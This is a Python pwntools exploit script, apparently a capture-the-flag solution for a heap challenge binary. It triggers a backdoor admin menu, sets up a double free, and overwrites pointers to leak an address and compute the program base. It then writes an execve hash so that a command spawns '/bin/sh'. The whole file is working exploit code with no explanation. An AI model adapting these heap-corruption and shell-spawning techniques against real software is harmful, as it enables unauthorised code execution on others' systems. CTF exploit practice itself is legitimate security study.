from pwn import *
import os
os.chdir("./admin_output")

def attach(r, addr):
    if (type(r) is remote):
        return
    if r.elf.pie:
        addr += r.libs()[r.elf.path]
    gdb.attach(r, gdbscript='b *{}'.format(addr))

# context.log_level = "debug"
# context.terminal = ['gnome-terminal','-x','bash','-c']
context.terminal = ['terminator','-x','sh','-c']

r = process("./main")

def send_cmd(cmd):
    r.sendlineafter("choice:", str(cmd))

def admin_setseed(seed):
    r.sendlineafter("choice:", "6")
    r.sendlineafter("You cheat code please:", str(seed))

def disableFASLR():
    r.sendlineafter("choice:", "7")

def malloc(size):
    r.sendlineafter("choice:", "1")
    r.sendlineafter("size?", str(size))

def edit(idx, size, content):
    r.sendlineafter("choice:", "2")
    r.sendlineafter("index?", str(idx))
    r.sendlineafter("size?", str(size))
    r.send(content)

def show(idx):
    r.sendlineafter("choice:", "3")
    r.sendlineafter("index?", str(idx))

def free(idx):
    r.sendlineafter("choice:", "4")
    r.sendlineafter("index?", str(idx))

# r.sendlineafter("What's your name:", "/bin/sh")
r.sendafter("What's your name:", "/bin/sh\x00")

# backdoor to get admin
send_cmd("666")
send_cmd("3")
admin_setseed(1182721)

malloc(0x100)
malloc(0x100)
malloc(32)          # 0
malloc(40)          # 1
malloc(32)          # 2
malloc(40)          # 3
malloc(40)          # 4 padding

free(0+2)
free(1+2)
free(2+2)
free(3+2)

disableFASLR()      # double free

admin_setseed(32)
malloc(32)          # 0
payload = p64(0x700000000+0x128) + p64(0x700000000+0x128)

free(1)
# free(0)

import binascii
print(binascii.hexlify(payload))
edit(2, len(payload), payload)



malloc(32)          # 1
malloc(32)          # 2 == 0
malloc(32)

# ptr[4] 0x0000000700000130 size 0x20
# ptr[7] 0x0000000700000128 size 0
p1 = p64(0x300000)
edit(4, len(p1), p1)
show(1)

dyncall_addr = u64(r.recvline()[:-1].ljust(8, b"\x00"))
print(hex(dyncall_addr))
dyncall_offset = 0xA460
elf_base = dyncall_addr - dyncall_offset
print(f"Elf base: {hex(elf_base)}")

# admin_setseed(0)
# disableFASLR()

# func_block_st__bss_execve_addr = 0x700000000 + 0x1b8 + 31*8
# p1 = p64(func_block_st__bss_execve_addr)
# edit(4, len(p1), p1)
# show(1)
# func_block_st_ = u64(r.recvline()[:-1].ljust(8, b"\x00"))
# p1 = p64(func_block_st__bss_execve_addr)
# edit(4, len(p1), p1)
# show(1)
# execve_addr = 

puts_addr = elf_base + 0xCC030
p1 = p64(puts_addr)
edit(4, len(p1), p1)
execve_hash = b'\x8f\xbc\xa1\xbdY$7\xc8$\xb0\x99\x02qR}\xa1'
edit(1, len(execve_hash), execve_hash)

send_cmd("999")
send_cmd("999")

r.sendline("echo 0ops!; exit")
print(r.recvall())

# attach(r, 0xA7DC)

# r.interactive()


